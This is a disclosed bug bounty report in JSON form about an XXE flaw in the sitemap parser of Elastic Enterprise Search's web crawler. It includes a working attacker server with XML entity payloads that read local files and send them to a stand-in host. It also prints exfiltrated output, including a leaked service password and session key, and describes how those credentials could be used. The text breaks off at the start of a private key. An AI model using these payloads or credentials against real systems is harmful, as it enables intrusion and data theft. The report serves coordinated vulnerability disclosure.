{
  "id": 1156748,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTU2NzQ4",
  "url": "https://hackerone.com/reports/1156748",
  "title": "XXE in Enterprise Search's App Search web crawler",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-04-08T04:42:57.032Z",
  "submitted_at": "2021-04-08T04:42:57.058Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dee-see",
    "url": "/dee-see",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23607,
    "url": "https://hackerone.com/elastic",
    "handle": "elastic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Elastic",
      "twitter_handle": "elastic",
      "website": "https://www.elastic.co/",
      "about": "Search, solve, and succeed with one platform, three search-powered solutions, built on a single technology stack"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-29T15:05:10.100Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-29T15:05:10.011Z",
  "team_member_agreed_on_going_public_at": "2021-04-29T14:57:13.759Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary\n\nHello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-content.html#crawl-web-content-manage-sitemaps). Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.\n\n## Description\n\nEnterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for `robots.txt` files and in that file it will look for the `sitemap` directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.\n\nThe code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.\n\n## Steps to reproduce\n\n### Attacker Server\n\nThis is my attacker server, it's a ruby application that requires `sinatra` (`gem install sinatra`)\n\n```ruby\nrequire 'sinatra'\n\nset :bind, '0.0.0.0'\n\nget '/robots.txt' do\n\n  'User-agent: *\nDisallow:\n\nsitemap: /sitemap.xml\n'\nend\n\nget '/sitemap.xml' do\n  content_type 'application/xml'\n\n  '<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n<!ENTITY % dtd SYSTEM \"http://YOURDOMAIN.COM/exfil.dtd\">\n%dtd;\n%param1;\n%exfil;\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n<url>\n    <loc>&test;</loc>\n    <lastmod>2019-06-19</lastmod>\n    <changefreq>daily</changefreq>\n</url>\n</urlset>'\nend\n\nget '/exfil.dtd' do\n  content_type 'application/xml-dtd'\n\n  '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY % data SYSTEM \"file:///etc/hostname\">\n<!ENTITY % param1 \"<!ENTITY &#x25; exfil SYSTEM \\'http://YOURDOMAIN.COM/exfil?%data;\\'>\">'\nend\n```\n\nSave that to a file and run it with `ruby server.rb`.\n\n\n### Enterprise Search\n\n1. Log in to Enterprise Search\n1. Click `Launch App Search`\n1. Click `Create an Engine`, give it any name and click `Create Engine`\n1. Click `Use the Web Crawler`\n1. Enter the domain hosting the XXE payload as the `Domain URL`\n1. Click `Start a Crawl` and observe your server logs, you should see the hostname of the targetted machine\n\nRunning this on an Elastic Cloud instance I got this in my log.\n\n```text\n20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] \"GET /exfil?d403d12993e0 HTTP/1.1\" 404 459\n```\n\nWhere `d403d12993e0` is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.\n\n## Impact\n\nAt the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.",
  "weakness": {
    "id": 54,
    "name": "XML External Entities (XXE)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [

  ],
  "allow_singular_disclosure_at": "2021-05-29T14:57:13.885Z",
  "allow_singular_disclosure_after": -73152997.34646621,
  "singular_disclosure_allowed": true,
  "vote_count": 6,
  "voters": [
    "alexbrasetvik",
    "haxor31337",
    "bogdantcaciuc",
    "dmc3",
    "superman85",
    "thelilnix"
  ],
  "severity": {
    "rating": "critical",
    "score": 9.1,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 4424,
    "asset_type": "URL",
    "asset_identifier": "cloud.elastic.co",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 11312476,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I guess since I report so many denial of service issues I should take the time to mention that this could be used for a billion laughs attack and cause a denial of service. :)",
      "automated_response": false,
      "created_at": "2021-04-08T04:43:50.475Z",
      "updated_at": "2021-04-08T04:43:50.475Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11317344,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Ok I got this further.\n\nIn the server above replace the `sitemap.xml` route with\n\n```ruby\nget '/sitemap.xml' do\n  content_type 'application/xml'\n\n  '<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n<!ENTITY test \"http://YOURDOMAIN.COM/pingback\"> \n<!ENTITY file SYSTEM \"file:///\">\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n<url>\n    <loc>&test;?&file;</loc>\n    <lastmod>2019-06-19</lastmod>\n    <changefreq>daily</changefreq>\n</url>\n</urlset>'\nend\n```\n\nand add this\n\n```ruby\nget '/pingback' do\n  puts URI.unescape(request.query_string)\nend\n```\n\nAnd we obtain this file listing.\n\n```text\n.dockerenv\napp \nbin    \ndev   \netc \nhome\nlib         \nlib64     \nlicenses   \nlost+found\nmedia\nmnt \nopt     \nproc    \nroot\nrun  \nsbin\nsrv          \nsys    \ntmp        \nusr       \nvar\n```\n\nChanging the `file` entity to `file:///etc/passwd` we can obtain\n\n```text\nroot:x:0:0:root:/root:/bin/bash                                                               \nbin:x:1:1:bin:/bin:/sbin/nologin   \ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown                                            \nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin                                  \nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nsystemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\n```\n",
      "automated_response": false,
      "created_at": "2021-04-08T12:19:51.356Z",
      "updated_at": "2021-04-08T12:19:51.356Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11318070,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "`/app/insance_data.json`\n\n```json\n{\"instance_capacity\":2048,\"instance_configuration_id\":\"azure.enterprisesearch.d64sv3\",\"allocator_filter\":{\"bool\":{\"must\":[{\"bool\":{\"must\":[{\"bool\":{\"must\":[{\"term\":{\"data.attributes.metadata.instanceFamily\":{\"value\":\"azure.highcpu\"}}}]}}]}}]}},\"node_types\":[\"appserver\",\"worker\",\"connector\"],\"observability\":null,\"resources\":{\"quota\":{\"fs_multiplier\":2.0}},\"plan_version\":\"1.0\",\"enterprise_search\":{\"elasticsearch_url\":\"http://39697b1758d84fdfaad67f53b8a18931.containerhost:9244\",\"enterprise_search_elasticsearch_username\":\"cloud-internal-enterprise_search-server\",\"enterprise_search_elasticsearch_password\":\"o8Q250QCZWAl7aBuw8V0Ofbl\",\"version\":\"7.12.0\",\"external_port\":443,\"external_host\":\"enterprise-search-deployment-9af999.ent.eastus.azure.elastic-cloud.com\",\"secret_session_key\":\"QvCILaiynaQ4P6c5z8$7Lxb5Zjg96sXDs3eZAkpW5Dw=\"},\"identity\":{\"service_provider\":{\"security_realms\":{\"saml\":[{\"name\":\"cloud-saml-enterprise_search-40123656d7064c9fa7cbb58faa59f64d\",\"order\":100,\"description\":\"Log in with El$\nstic Cloud\",\"icon\":\"logoCloud\"}],\"basic\":[]}}},\"logical_zone_name\":\"zone-0\",\"start\":true,\"maintenance\":false,\"source\":{\"facilitator\":\"constructor\",\"action\":\"enterprise_search.create-instances\",\"date\":$2021-04-08T03:02:50.640Z\",\"plan_id\":\"cbba05f3-d2cf-41e3-8458-af2f4edb1aa7\"},\"tls\":{\"node_name\":\"instance-0000000000.node.40123656d7064c9fa7cbb58faa59f64d.cluster.2534374091.account\",\"encrypted_transpo$t\":true,\"encrypted_http\":true},\"allocator_name\":\"0d192425-ec2b-4232-805f-07412106ea8c\",\"allocator_id\":\"0d192425-ec2b-4232-805f-07412106ea8c\",\"allocator_zone_name\":\"eastus-3\",\"overrides\":{\"resources\":{$}} \n```\n\n`/app/config/certs/` directory listing\n\n```text\ninternal_tls_ca.crt\nkeystore.kcs\nnode.crt\nnode.key\ntrust.yml\n```\n\nThe `.key` file looks like a private key.\n\n`/app/config/beats.json`\n\n```json\n{\"ece.cluster\":\"40123656d7064c9fa7cbb58faa59f64d\",\"ece.instance\":\"instance-0000000000\"}\n```\n\nUnfortunately (for me!) I can't pull `/app/config/enterprise_search.yml`. I think it might be too long for a URL?",
      "automated_response": false,
      "created_at": "2021-04-08T12:31:42.713Z",
      "updated_at": "2021-04-08T12:31:42.713Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11318560,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Alright got to start my work day, let me know if that's not a critical yet I'll try harder. ;) I could send HTTP requests to an external host and read the body but I had no success pulling data from the AWS metadata endpoint yet.",
      "automated_response": false,
      "created_at": "2021-04-08T12:48:40.967Z",
      "updated_at": "2021-04-08T12:49:28.334Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11319986,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Ah it's azure, I'm an idiot that explains why there's no AWS metadata :D But I'm pretty sure I *could* fetch the metadata if someone running it on premise on an AWS instance was to crawl my website.",
      "automated_response": false,
      "created_at": "2021-04-08T13:10:19.002Z",
      "updated_at": "2021-04-08T13:11:14.692Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11334133,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @dee-see,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@croissants",
      "automated_response": false,
      "created_at": "2021-04-09T11:34:51.878Z",
      "updated_at": "2021-04-09T11:34:51.878Z",
      "actor": {
        "username": "h1_analyst_robert",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_robert",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/zx18sqg0dqy4039yhin3qc2z1xo1/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%228801910063134.png%22%3B%20filename%2A%3DUTF-8%27%278801910063134.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071351Z&X-Amz-Expires=3561&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fcdfed64457821f6e266fdbaceb43f4bc4be2f5764513c4001440a9a837e386"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11334166,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hi @dee-see \n\nI followed the steps you provided. However, when the web crawler hits my server, I'm not getting any additional request to /exfil.dtd and I don't get the request showing the XML content has been parsed. \n\n{F1259479}\n\nAm I missing something? \n\nKind regards, \n@croissants ",
      "automated_response": false,
      "created_at": "2021-04-09T11:37:48.664Z",
      "updated_at": "2021-04-09T11:37:48.664Z",
      "actor": {
        "username": "h1_analyst_robert",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_robert",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/zx18sqg0dqy4039yhin3qc2z1xo1/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%228801910063134.png%22%3B%20filename%2A%3DUTF-8%27%278801910063134.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071351Z&X-Amz-Expires=3561&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fcdfed64457821f6e266fdbaceb43f4bc4be2f5764513c4001440a9a837e386"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1259479,
          "filename": "Screen_Shot_2021-04-09_at_1.34.02_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jq6gh7z5zf1l3gpwwk2gw35s1m83?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2021-04-09_at_1.34.02_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2021-04-09_at_1.34.02_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071351Z&X-Amz-Expires=3561&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=93a0dfe45c1ee1cb8ec430c157c9a54265d450fdfa11afbf5be6f0427855a683"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11334202,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @croissants,\n\nProbably :) Can you copy paste the contents of your server file here so I can take a look? Make sure you replace the `YOURDOMAIN.COM` values from the XML payloads and include the port number. I should have been more explicit about that sorry.",
      "automated_response": false,
      "created_at": "2021-04-09T11:42:15.202Z",
      "updated_at": "2021-04-09T11:42:15.202Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11351206,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I took the time to think about what all this data meant and about a few real world scenarios and I pretty much wrote a novel. :)\n\nAttack scenario 1: A website owner sees in their traffic logs that they're being crawled by App Search.\n\nBy using the attack above and leaking `/app/instance_data.json` they can grab the following information\n\n- `external_host`: `enterprise-search-deployment-9af999.ent.eastus.azure.elastic-cloud.com`\n- `enterprise_search_elasticsearch_username`: `cloud-internal-enterprise_search-server`\n- `enterprise_search_elasticsearch_password`: `o8Q250QCZWAl7aBuw8V0Ofbl`\n\nThen they can navigate to https://enterprise-search-deployment-9af999.ent.eastus.azure.elastic-cloud.com/ent/select and see or delete all the data in App Search and Workspace Search. They also have access to the credentials pages which list read/write API tokens in plain text so they steal that and keep persistence until they're revoked. It's basically \"owner\" access to enterprise search. The same creds can also be used to log into the elastic search instance which will be located at `https://enterprise-search-deployment-9af999.es.eastus.azure.elastic-cloud.com:9243/` (basically replace `ent` with `es` in the `external_host` above and add the port). For example here's a JSON dump <https://cloud-internal-enterprise_search-server:o8Q250QCZWAl7aBuw8V0Ofbl@enterprise-search-deployment-9af999.es.eastus.azure.elastic-cloud.com:9243/_all> of the ES structures the user has access to.\n\nCVSS: `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` 8.7\n\nAttack scenario 2: A user with `Dev` access to Enterprise Search (`Dev` can manage everything about a given engine but can't see the other engines they haven't been assigned to) who wants to escalate their privilege. They can point their engine to a site map they control and carry out the same attack as above and become owner.\n\nCVSS: Somewhere between `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` 9.6 and `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N` 8.7 (PR low or high... `Dev` is in the middle of the Enterprise Search role hierarchy so I don't know which one to choose ðŸ¤·)\n\nAdditionally an attacker can get the `secret_session_key` (`QvCILaiynaQ4P6c5z8N7Lxb5Zjg96sXDs3eZAkpW5Dw`) which appears to be used for user sessions and with some reverse engineering *might* lead to forged cookies.\n\nThere's also a private key\n\n```\n-----BEGIN RSA PRIVATE 